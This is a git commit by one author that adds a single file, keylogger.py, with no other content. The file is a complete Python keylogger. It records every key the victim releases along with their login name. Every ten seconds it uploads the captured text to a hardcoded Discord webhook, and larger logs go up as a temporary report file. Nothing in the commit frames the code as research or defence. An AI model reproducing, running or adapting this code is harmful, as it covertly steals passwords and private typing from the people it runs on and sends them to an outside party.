2324a4af5973e7e9195a3b86af93421f968a5616
Samrat Chaudhary <whitecollarsamrat@gmail.com>
2024-02-26 20:36:47 +0545

    Added files

---
+++ keylogger.py
@@ -0,0 +1,83 @@
+import sys
+import keyboard,os
+from threading import Timer
+from datetime import datetime
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+SEND_REPORT_EVERY=10
+WEBHOOK="https://discord.com/api/webhooks/1211163203967516692/XpP-V-4d8QdlLfuCyXfPfcpZyRIS1_Yh-QnrWXWR3cip1qCTpKUy_elNwbyaoUja62dA"
+
+class Keylogger: 
+    # ANSI escape codes for colors
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    END = '\033[0m'
+
+    print(GREEN + "Starting..." + END)
+
+    def __init__(self, interval, report_method="webhook"):
+        now = datetime.now()
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.username = os.getlogin()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
+    def report_to_webhook(self):
+        flag = False
+        webhook = DiscordWebhook(url=WEBHOOK)
+        if len(self.log) > 2000:
+            flag = True
+            path = os.environ["temp"] + "\\report.txt"
+            with open(path, 'w+') as file:
+                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
+                file.write(self.log)
+            with open(path, 'rb') as f:
+                webhook.add_file(file=f.read(), filename='report.txt')
+        else:
+            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
+            webhook.add_embed(embed)    
+        webhook.execute()
+        if flag:
+            os.remove(path)
+
+    def report(self):
+        if self.log:
+            if self.report_method == "webhook":
+                self.report_to_webhook()    
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        try:
+            while True:
+                self.start_dt = datetime.now()
+                keyboard.on_release(callback=self.callback)
+                self.report()
+                keyboard.wait()
+        except KeyboardInterrupt:
+            # Print your exit message
+            print(self.RED + "\nExiting..." + self.END)
+            # Exit the script
+            sys.exit(0) 
+    
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
+    keylogger.start()
